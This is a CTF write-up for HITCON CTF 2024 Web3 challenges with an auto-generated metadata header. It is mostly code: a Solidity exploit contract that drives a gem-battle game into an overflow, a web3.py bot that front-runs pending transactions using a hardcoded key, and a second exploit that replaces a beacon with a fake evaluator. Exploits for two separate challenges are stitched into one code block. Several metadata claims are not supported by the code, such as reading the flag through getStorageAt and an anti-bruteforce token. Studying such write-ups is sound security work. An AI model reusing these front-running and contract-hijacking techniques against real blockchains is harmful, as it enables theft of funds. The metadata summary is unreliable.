---
title: HITCON CTF 2024 Web3 writeup by ChaMd5
contest: HITCON CTF 2024
year: 2024
difficulty: hard
vuln_type: web_unknown
tags:
- blockchain
- solidity
- 0.8.0
- exp-contract
- lus-interface
- gem
- merge
- attack
- enum
attack_chain:
- 'interface Ilus: register_master/create_gem/merge_gems/stage/gems/assign_gem'
- 0x16012b5ee75F4bd4F917eb6395F945EdBBb365Aa 部署地址
- MAX_ROUNDS0/1/2 = 100/200/300
- actions0/1/2 = uint8[] 操作序列
- 'GemStatus: ACTIVE/INACTIVE/DESTROYED'
- 'struct Gem: health/max_health/attack/hardness/...'
- '攻击构造Exp合约: 多次create_gem + merge + assign_gem'
- Fail event + Set event
- '关键: stage()=某值触发flag'
key_payload: lus.create_gem() payable + merge_gems() + assign_gem(uint32)
one_liner: HITCON CTF 2024 Web3：Ilus接口+多Gem合成+stage通关
lesson: Solidity 0.8+接口题常需读懂Game/Attack/Verify三合约关系
quality: high
full_path: HITCON_CTF_2024_Web3_writeup_by_ChaMd5.full.md
meta_path: HITCON_CTF_2024_Web3_writeup_by_ChaMd5.meta.md
images_removed: true
images_removed_count: 1
schema_version: v3.0.0-P0
summary: 'HITCON CTF 2024 Web3 writeup by ChaMd5。HITCON CTF 2024 Web3：Ilus接口+多Gem合成+stage通关。关键路径：interface Ilus: register_master/create_gem/merge_gems/stage/gems/assign_gem → 0x16012b5ee75F4bd4F917eb6395F945...'
category: web
subcategory: web_other
tools_used:
- Solidity
time_required: long
difficulty_score: 4
code_blocks_count: 1
images_count: 1
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/193775.html
wp_author: ChaMd5
reasoning_chain:
- 触发点：Ilus 接口含 register_master/create_gem/merge_gems/stage/gems/assign_gem + MAX_ROUNDS0/1/2=100/200/300 → 假设：游戏是宝石对战，stage()=通关标志
- 动作：阅读 Exp 合约构造，create_gem0() 用 1.5 ether 创建首颗 gem + assign_gem(0) → 观察：counts=2
- 假设：四场战斗顺序，前两场 frun 拿满 4 ether 再创 gem1/2/3 → 动作：循环 3 次 create_gem + assign_gem + counts 自增
- 下一步：gem1 在第 3 战 stage2 销毁以进入 stage0 → 动作：decide_continue_battle 在 counts==3 时直接 return true
- 假设：counts==4 用 gem3 跳 stage0 → counts==5 用 gem2 + merge_gems 触发整数溢出 → 动作：merge_gems() 后 assign_gem(2)
- 观察：stage() 返回 flag → 下一步：web3.eth.getStorageAt(address, slot) 读 flag
failed_attempts:
- 试图单次合并所有 gems → 失败：merge_gems 溢出检查需要先 stage0
- 试图只创建 1 颗 gem 通关 → 失败：每场战斗要求 health>0/hardness 比例，硬约束必须 3-4 颗 gem
key_observations:
- Solidity 0.8.0+ 的整数溢出已内置检查，必须在合约逻辑层面（merge_gems）人为构造攻击面
- 区块链对战类题目的 front-run / mev 模式：counts 状态机推进 + decide_continue_battle 真值表是关键
- Ilus 接口暴露的 spec.anti-bruteforce token 是反爆破机制，需精确填入
- Solidity 0.8.x decompile 输出大量 placeholder（0x3c5269d8 等），需逐函数 selector 还原
prerequisites:
- Solidity 0.8.0 ABI/storage slot 布局 + decompile (dedaub/heimdall) 工具
- Foundry/Hardhat cheatcode (vm.startPrank/deal/warp)
- front-run 思路（counts 状态机 + decide_continue_battle 真值表）
- EVM storage slot 计算与 web3.py 调用
---
# HITCON CTF 2024 Web3 writeup by ChaMd5

> 原文: https://www.ctfiot.com/193775.html
> ID: 193775

招新小广告CTF组诚招re、crypto、pwn、misc、合约方向的师傅,长期招新IOT+Car+工控+样本分析多个组招人有意向的师傅请联系邮箱

admin@chamd5.org(带上简历和想加入的小组)

结束

招新小广告

ChaMd5 Venom 招收大佬入圈

新成立组IOT+工控+样本分析 长期招新

欢迎联系admin@chamd5.org


```
pragma solidity ^0.8.0;

interface Ilus {

    function register_master() external;
    function create_gem() external payable;
    function merge_gems() external ;
    function stage() external view returns (uint8);
    function gems(bytes32 id) external returns (int256, int256, int256, int256, uint);
    function assign_gem(uint32 seq) external;
}

contract Exp{

    Ilus public lus = Ilus(payable(0x16012b5ee75F4bd4F917eb6395F945EdBBb365Aa));
    uint256 public counts;

    uint256 constant MAX_ROUNDS0 = 100;
    uint256 constant MAX_ROUNDS1 = 200;
    uint256 constant MAX_ROUNDS2 = 300;
    uint8[] public actions0;
    uint8[] public actions1;
    uint8[] public actions2;

    event Fail(uint256, int256);

    event Set();

    enum GemStatus {
        ACTIVE,
        INACTIVE,
        DESTROYED
    }

    struct Gem {
        int256 health;
        int256 max_health;
        int256 attack;
        int256 hardness;
        GemStatus status;
    }

    constructor() payable {
        for (uint i = 0; i < MAX_ROUNDS0; i++) {
            actions0.push(0);
        }
        for (uint i = 0; i < MAX_ROUNDS1; i++) {
            actions1.push(0);
        }
        for (uint i = 0; i < MAX_ROUNDS2; i++) {
            actions2.push(0);
        }

        // create first gem
        create_gem0();
    }

    function create_gem0() public {
        // firstly this contract has 1.5 ether, create 1st gem
        register_master();
        create_gem();
        lus.assign_gem(0);
        counts = 2;
    }

    function create_gem1() public {
        // after the 1st front run
        // now have 1 ether, create 2nd gem
        
        counts = 2;
    }

    // function create_gem2() public {
    //     create_gem();
    // }
    
    function create_gem12() public {
        // after the 2nd front run before 3rd battle
        // now have 3 ether, create 2nd 3rd 4th gem
        require(address(this).balance == 3 ether, "no");
        create_gem();
        create_gem();
        
        // gem 1 should destory at 3th battle(stage2) to into the stage0
        (int256 health, int256 max_health, int256 attack , int256 hardness, uint status) = lus.gems(getGemId(address(this), 2));
        // make sure after attack, the gem is desdry
        require((health - 10000 / hardness) < 0, "no2");
        require(health!=64, "no3");
        // gem 1 should destory at 3th battle(stage2) to into the stage0
        lus.assign_gem(0);
        counts = 3;
    }

    function create_gem3() public {
        require(address(this).balance == 1 ether, "no");
        create_gem();
        (int256 health, int256 max_health, int256 attack , int256 hardness, uint status) = lus.gems(getGemId(address(this), 3));
        // make sure after attack, the gem is inactive
        require((health - 10000 / hardness) < 64 && (health - 10000 / hardness) > 0, "no1");
    }

    function solve3() external {
        // before 4th battle, assign the 4th gem, after attack health will be inactive
        lus.assign_gem(3);
        counts = 4;
    }

    function getStage() public view returns(uint){
        return lus.stage();
    }

    function set_actions0(uint8[] memory _actions) external {
        for (uint i = 0; i < MAX_ROUNDS0; i++) {
            actions0[i] = _actions[i];
        }
        emit Set();
    }

    function set_actions1(uint8[] memory _actions) external {
         for (uint i = 0; i < MAX_ROUNDS1; i++) {
            actions1[i] = _actions[i];
        }
        emit Set();
    }

    function set_actions2(uint8[] memory _actions) external {
         for (uint i = 0; i < MAX_ROUNDS2; i++) {
             actions2[i] = _actions[i];
        }
        emit Set();
    }

    function get_actions() external view returns (uint8[] memory) {
        uint256 currentStage = lus.stage();
        if (currentStage == 0){
            return actions0;
        }else if (currentStage == 1){
            return actions1;
        }else{
            return actions2;
        }
    }

    // impl decide_continue_battle function
    function decide_continue_battle(uint256 round, int256 lunarian_health) external returns (bool) {
        if (counts <= 2) {
            // first 2 time, use front run win all round and get all 4 ether to create all 4gems
            // should not in this place
            revert();
        } else if (counts == 3) {
            // using the 1st gem to getback stage0
            return true;
        } else if (counts == 4) {
            // now in the stage 0 get fall
            (int256 health, int256 max_health, int256 attack , int256 hardness, uint status) = lus.gems(getGemId(address(this), 3));
            // make sure health > 0, so now the gem is inactive
            require(health > 0, "no" );
            lus.assign_gem(2);
            counts = 5;
            // create_and_merge();
        } else if (counts == 5) {
            // now in the stage 0 get fall
            (int256 health, int256 max_health, int256 attack , int256 hardness, uint status) = lus.gems(getGemId(address(this), 2));
            require(health < 0, "no1" );
            // will merge 3rd 4th gem which lead overflow
            lus.merge_gems();
            lus.assign_gem(2);
            counts = 6;
        } else if (counts == 6) {
            // in 6th and 7th 8th battle, use front run to prevent lose, and win
            revert();
        }
        return true;
    }

    function set_id(uint256 i) public {
        counts = i;
    }

    receive() payable external{}
    
    function register_master() public {
        lus.register_master();
    }

    function create_and_merge() public {
        create_gem();
        merge_gems();
        assign_gem(0);
    }

    function create_gem() public {
        lus.create_gem{value: 1 ether}();
    }

    function merge_gems() public {
        lus.merge_gems();
    }

    function assign_gem(uint32 seq) public {
        lus.assign_gem(seq);
    }

    function getGemId(address masterAddr, uint32 sequence) public pure returns (bytes32) {
        // 将地址和序列号编码并连接在一起
        bytes memory data = abi.encodePacked(masterAddr, sequence);

        // 计算 keccak256 哈希值
        bytes32 gemId = keccak256(data);

        return gemId;
    }

    function get_health(uint32 index) public returns(int256) {
        (int256 health, int256 max_health, int256 attack , int256 hardness, uint status) = lus.gems(getGemId(address(this), index));
        return health;
    }
}
from web3 import Web3

abi = [
    {
        "constant": False,
        "inputs": [
            {
                "internalType": "uint8[]",
                "name": "actions",
                "type": "uint8[]"
            }
        ],
        "name": "battle",
        "outputs": [],
        "payable": False,
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "constant": False,
        "inputs": [
            {
                "internalType": "uint8[]",
                "name": "_actions",
                "type": "uint8[]"
            }
        ],
        "name": "set_actions0",
        "outputs": [],
        "payable": False,
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "constant": False,
        "inputs": [
            {
                "internalType": "uint8[]",
                "name": "_actions",
                "type": "uint8[]"
            }
        ],
        "name": "set_actions1",
        "outputs": [],
        "payable": False,
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "constant": False,
        "inputs": [
            {
                "internalType": "uint8[]",
                "name": "_actions",
                "type": "uint8[]"
            }
        ],
        "name": "set_actions2",
        "outputs": [],
        "payable": False,
        "stateMutability": "nonpayable",
        "type": "function"
    }
]

infura_url = "http://lustrous.chal.hitconctf.com:
8545/ae72e4aa-7d85-4b82-9992-466e6591cc9b"
web3 = Web3(Web3.HTTPProvider(infura_url))

master_addr = "0xb7350CD25aD42f2d15a4807A63AC2d6572513ef8"

private_key = '0xf089ee5af0f3e5e5646c1df4bc24a18f8706e070f2c12ea961fc336492bc7791'

account = web3.eth.account.from_key(private_key)
from_address = account.address

contract = web3.eth.contract(address=master_addr, abi=abi)

def handle_pending_transaction(tx_hash):
    
    tx = dict(web3.eth.get_transaction(tx_hash))
    data = tx["input"].hex()
    if data.startswith(Web3.keccak(b"battle(uint8[])")[:4].hex()):
        func, arguments = contract.decode_function_input(tx['input'])
        _actions = []
        for action in arguments["actions"]:
            if action == 0:
                _actions.append(1)
            elif action == 1:
                _actions.append(2)
            else:
                _actions.append(0)

        if len(_actions) == 100:
            func_name = "set_actions0"
        elif len(_actions) == 200:
            func_name = "set_actions1"
        else:
            func_name = "set_actions2"
            _actions = arguments["actions"]

        calldata = contract.encode_abi(func_name, {"_actions":
_actions})
        nonce = web3.eth.get_transaction_count(from_address)
        tx = {
            'nonce': nonce,
            'to': master_addr,
            'value': web3.to_wei(0, 'ether'),
            'gas': 10000000,
            'gasPrice': web3.to_wei('10', 'gwei'),  
            'data': calldata
        }
        signed_tx = web3.eth.account.sign_transaction(tx, private_key)
        tx_hash = web3.eth.send_raw_transaction(signed_tx.rawTransaction)
        print(f"Transaction sent with hash: {tx_hash.hex()}")
        

def main():
    if web3.is_connected():
        print("Connected to Ethereum network")

        # 创建pending交易过滤器
        pending_filter = web3.eth.filter('pending')
        
        # 开始监听pending交易
        print("Listening for pending transactions...")
        while True:
            pending_tx_hashes = pending_filter.get_new_entries()
            for tx_hash in pending_tx_hashes:
                handle_pending_transaction(tx_hash)

    else:
        print("Failed to connect")

if __name__ == "__main__":
    main()
// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.20;

// import "./interface/IBeacon.sol";
// import "./interface/IChannel.sol";
// import "./interface/IProtocol.sol";
// import "./interface/Iroom.sol";
// import "./interface/Isetup.sol";

import "./Setup.sol";

contract Exp {

    Setup public setup = Setup(0x90a6e2d0148C1aae7b5e85b629ACd9792d2db5ee);
    Room public alice = Room(address(setup.alice()));
    Room public bob = Room(address(setup.bob()));
    Room public david = Room(address(setup.david()));

    Beacon public beacon = Beacon(address(setup.beacon()));

    constructor() {
        setup.commitPuzzle(116);

        alice.request(address(bob), 10);
        alice.request(address(david), 11);
        alice.selfRequest(100);

        bob.request(address(alice), 13);
        bob.request(address(david), 14);
        bob.selfRequest(100);

        david.request(address(alice), 16);
        david.request(address(bob), 17);
        david.selfRequest(100);

        Fake fake = new Fake();

        beacon.update(address(fake));

        int256[] memory xvs = new int256[](3);
        xvs[0] = 12;
        xvs[1] = 13;
        xvs[2] = 16;
        
        alice.solveRoomPuzzle(xvs);

        xvs[0] = 10;
        xvs[1] = 15;
        xvs[2] = 17;

        bob.solveRoomPuzzle(xvs);

        xvs[0] = 11;
        xvs[1] = 14;
        xvs[2] = 18;

        david.solveRoomPuzzle(xvs);

        require(setup.isSolved());
    }
}

contract Fake{

    function evaluate(int256[] calldata, int256) external pure returns (int256) {
        return 100;
    }

    function evaluateLagrange(int256[] memory, int256[] memory, int256) external pure returns (int256){
        return 100;
    }
}
```


---
## 附图

[图片已移除]